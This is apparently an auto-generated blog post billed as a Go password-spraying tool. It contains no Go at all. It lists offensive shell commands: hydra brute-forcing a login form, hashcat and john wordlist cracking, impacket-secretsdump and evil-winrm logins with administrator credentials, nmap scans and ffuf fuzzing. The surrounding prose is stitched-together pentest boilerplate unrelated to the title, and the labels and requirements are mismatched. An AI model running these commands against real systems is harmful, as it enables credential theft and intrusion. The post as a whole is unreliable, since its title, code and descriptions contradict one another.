---
TitleSEO: "Password Spraying Tool in Go | ZureFX"
TitlePost: "Password Spraying Tool — Go"
Author: "ZureFX"
Description: "A Go script for password spraying tool. Built for security research and automation."
Keywords: "python, scanner, automation, fuzzer, go"
URL: "https://zurefx.github.io/scripting/script-password-spraying-tool-257.html"
URL_IMAGES: ""
Date: "2024-12-11"
Tags: "Python, Scanner, Automation, Fuzzer, Go"
Section: "scripting"
Lang: "en"
main_img: "script-password-spraying-tool-257"
Permalink: "/scripting/script-password-spraying-tool-257.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Command injection was possible through unsanitized user input in the search functionality. The web application was vulnerable to Server-Side Template Injection (SSTI). The application stored sensitive credentials in an unencrypted configuration file.

Built with **Go** for offensive security automation.

### Requirements

- Go
- `impacket`
- `gobuster`
- `burpsuite`

## Implementation

### Core Logic

The service account had excessive permissions assigned in Active Directory. Initial enumeration revealed several interesting open ports on the target.

```go
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.15.117.14 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
nmap -sCV -p587,25,1521 10.51.211.108 -oN scan.txt
```

Lateral movement was facilitated by reusing discovered credentials across services. Network traffic analysis revealed unencrypted communications containing user credentials.

### Helper Functions

Command injection was possible through unsanitized user input in the search functionality. The kernel version was outdated and vulnerable to a publicly known exploit.

```go
impacket-secretsdump administrator:'P@ssw0rd!'@10.15.41.66
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
nmap -sCV -p25,993,5986 10.50.31.47 -oN scan.txt
```

## Usage

### Basic Usage

Initial enumeration revealed several interesting open ports on the target. Unconstrained delegation was enabled on the compromised machine.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.54.171.182/FUZZ
evil-winrm -i 10.61.172.72 -u administrator -p 'P@ssw0rd!'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

### Advanced Options

Lateral movement was facilitated by reusing discovered credentials across services. The service was running without proper input validation, leading to injection vulnerabilities. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## Output

### Example Output

Post-exploitation enumeration revealed a path to domain administrator privileges. Network traffic analysis revealed unencrypted communications containing user credentials.

```
[+] Scanning target...
[+] Found 7 results
[+] Done in 21.58s
```
